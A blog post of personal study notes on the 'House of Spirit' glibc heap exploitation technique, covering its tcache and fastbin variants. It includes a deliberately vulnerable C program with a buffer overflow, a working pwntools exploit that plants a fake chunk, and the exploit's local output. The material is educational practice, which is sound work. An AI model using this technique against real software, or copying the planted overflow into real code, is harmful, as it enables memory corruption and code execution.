---
layout: post
title: house-of-spirit
description:
date: 2025-11-02
categories:
  - notes
  - heap-exploitation
  - pwn
tags:
  - pwn
  - house-of-spirit
---



House of spirit attack allows us to get malloc to return a fake chunk to a region we have some control over (such as the bss or stack).


## Goal

Add a attacker controlled buffer into the `tcache/fastbin` so it can be later allocated by `malloc()`  

Obtain an arbitrary allocation primitive.

This technique requires a overflow or out of bounds write vulnerability in order to overwrite a pointer returned by `malloc()` before it is freed.

We can use this with `tcache` poisoning  to get code execution. 
## Steps

### Using Tcache

1. Prepare fake chunk
2. Overwrite a pointer returned by `malloc()` with the address of the fake chunk.
3. Free The fake chunk
4. The next call to `malloc` will return our fake chunk.
### Using Fastbin

1. Fill in `tcache`
2. Prepare fake chunks
	- Create 2 fake chunks.
		- The first chunk is where we want our chunk returned by `malloc` to be.
	- Restrictions to meet
		- Size of chunks should be within `fastbin` range (the 2 sizes do not have to be equal)
		- The size values must be placed where they should be if they were an actual chunk.
		- The size of the first heap chunk must be the same as the rounded up heap size of the `malloc()` that we we to allocate our fake chunk.
	- `is_mapped` and `non_main_arena` bits should be unset.
3. Overwrite a pointer returned by `malloc()` with the address of the first fake chunk.
4. Then free the chunk.
5. Take out the fake chunk.
	- `malloc()` will return our fake chunk



### 
1. Overwriting a pointer returned by `malloc()` which will then be passed to `free()`
	- This can lead to the linking of an arbitrary address into a `fastbin`.
2. A further call to `malloc()` can result in this arbitrary address being using as a chunk of memory


# Example

Vuln program

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>


char buf[0x50];
char *a;

int main() {
	a = malloc(0x20);
	printf("buf: %p\na is at: %p\na points to: %p\n\n", &buf, &a, a);
	printf("username: ");
	fgets(buf, 0x80, stdin);

	free(a);
	
	char *victim = malloc(0x20);

	printf("enter username again: ");
	fgets(buf, 0x50 - 1, stdin);

	printf("victim : %s\n", victim);

	return 0;
}	
```

exploit 

```python
def exploit():
	##################################################################### 
	######################## EXPLOIT CODE ###############################
	#####################################################################
	ru(b"buf: ")
	buf = int(rl(), 16)
	print_leak("buf", buf)
	ru(b"is at: ")
	chunk_a = int(rl(), 16)
	print_leak("a is at", chunk_a)
	ru(b"points to: ")
	addr = int(rl(), 16)
	print_leak("a points to", addr)

	leng =  chunk_a - buf

	# fake chunk
	payload = flat(
		0x0,
		0x31,
		cyclic((leng-16)),
		buf+16
	)
	sla(b"username: ", payload)

	x = b"A"*16+b"PWNED"
	
	sla(b"enter username again: ", x)
	ru(b"victim : ")
	data = rl().decode()
	log.info(f"Victim Chunk : {data}")
```

```sh
./xpl.py 
[*] '/usr/lib/x86_64-linux-gnu/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] Loaded 5 cached gadgets for './a.out'
[+] Starting local process '/home/hacker/REPO/exploitation-practice/house-of-spirit/a.out': pid 39150
[*] buf @ 0x404060
[*] a is at @ 0x4040b0
[*] a points to @ 0x3fe7d2a0
[*] Process '/home/hacker/REPO/exploitation-practice/house-of-spirit/a.out' stopped with exit code 0 (pid 39150)
[*] Victim Chunk : PWNED
[*] Switching to interactive mode
```